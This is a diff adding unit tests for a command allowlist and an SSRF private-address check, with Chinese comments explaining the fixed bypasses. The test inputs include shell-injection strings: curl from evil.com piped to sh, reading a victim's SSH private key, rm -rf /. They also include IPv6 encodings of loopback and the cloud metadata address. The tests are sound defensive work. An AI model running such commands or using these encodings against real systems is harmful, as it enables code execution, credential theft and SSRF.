@@ -111,6 +111,45 @@ describe('commandAllowed', () => {
   it('rejects an empty command', () => {
     expect(commandAllowed('   ', ['git'])).toBe(false);
   });
+
+  // 白名单只取首个 token，而执行侧把整条字符串交给 `cmd.exe /d /s /c`。所以
+  // `git` 在白名单里就等于「可以启动 git」，于是 `git && evil` 也是「启动 git」。
+  // 下面每一条在修复前都返回 true，也就是 shell.allow: ["git"] = 任意命令执行。
+  it('refuses shell chaining, substitution, redirection and variable expansion', () => {
+    const escapes = [
+      'git status && curl evil.com/x | sh',
+      'git status & type C:/Users/victim/.ssh/id_rsa',
+      'git status | cmd /c evil',
+      'git status ; rm -rf /',
+      'git status `whoami`',
+      'git status $(whoami)',
+      'git status > C:/out.txt',
+      'git status < C:/in.txt',
+      'git status %USERPROFILE%',
+      'git status ^& evil',
+      'git status\n evil',
+      'git status" && evil',
+    ];
+    for (const c of escapes) {
+      expect(commandAllowed(c, ['git']), c).toBe(false);
+    }
+  });
+
+  it('still allows the ordinary commands bundled MiniApps actually issue', () => {
+    // 元字符黑名单最容易犯的错是收得太宽、把内置应用真实的调用也毙了。
+    // `~` / `*` / `?` / `,` / `[]` / `{}` 是 glob 与花括号展开，只改参数不改
+    // 命令，所以刻意不收；`git diff HEAD~20 HEAD` 正是 git-graph 会发的。
+    const ok = [
+      'git status',
+      'git log --oneline',
+      'git diff HEAD~20 HEAD',
+      'git checkout main',
+      'git -C /some/dir status',
+    ];
+    for (const c of ok) {
+      expect(commandAllowed(c, ['git']), c).toBe(true);
+    }
+  });
 });
 
 describe('hostAllowed', () => {
@@ -143,6 +182,40 @@ describe('isPrivateHostname', () => {
   it('does not flag public hosts', () => {
     expect(isPrivateHostname('api.example.com')).toBe(false);
     expect(isPrivateHostname('172.32.0.1')).toBe(false);
+    expect(isPrivateHostname('8.8.8.8')).toBe(false);
+    expect(isPrivateHostname('2001:db8::1')).toBe(false);
+  });
+
+  // IPv6 有无穷多种写法，逐个补字面量是打地鼠：下面每一条在修复前都返回
+  // false，也就是「云 metadata / loopback 那条 SSRF 红线有一个绕过口」。
+  // [::ffff:a9fe:a9fe] 就是 169.254.169.254 的 IPv4-mapped 写法。
+  it('flags every spelling of the IPv6 ranges it is meant to cover', () => {
+    const privateV6 = [
+      '::1', // 展开写法
+      '0:0:0:0:0:0:0:1', // 同上，完全不压缩
+      '::', // 未指定
+      'fc00::1', // ULA
+      'fd12:3456::1', // ULA
+      'fc00:0:0:0:0:0:0:1', // ULA，展开写法
+      'fe80::1', // 链路本地
+      'fe80:0:0:0:0:0:0:1', // 同上，展开写法
+      '::ffff:7f00:1', // = 127.0.0.1
+      '::ffff:a9fe:a9fe', // = 169.254.169.254
+      '::ffff:127.0.0.1', // = 127.0.0.1，四段式
+      '::ffff:169.254.169.254', // = 云 metadata，四段式
+      '0:0:0:0:0:ffff:7f00:0001', // mapped，完全展开
+    ];
+    for (const h of privateV6) {
+      expect(isPrivateHostname(h), h).toBe(true);
+      expect(isPrivateHostname(`[${h}]`), `[${h}]`).toBe(true);
+    }
+  });
+
+  it('fails closed on something that only looks like an IPv6 address', () => {
+    // 解析不出来 = 不是我们认识的地址。放行一个"看不懂的地址"不是安全默认值。
+    expect(isPrivateHostname('::ffff::1')).toBe(true);
+    expect(isPrivateHostname('gggg::1')).toBe(true);
+    expect(isPrivateHostname('1:2:3:4:5:6:7:8:9')).toBe(true);
   });
 });
 
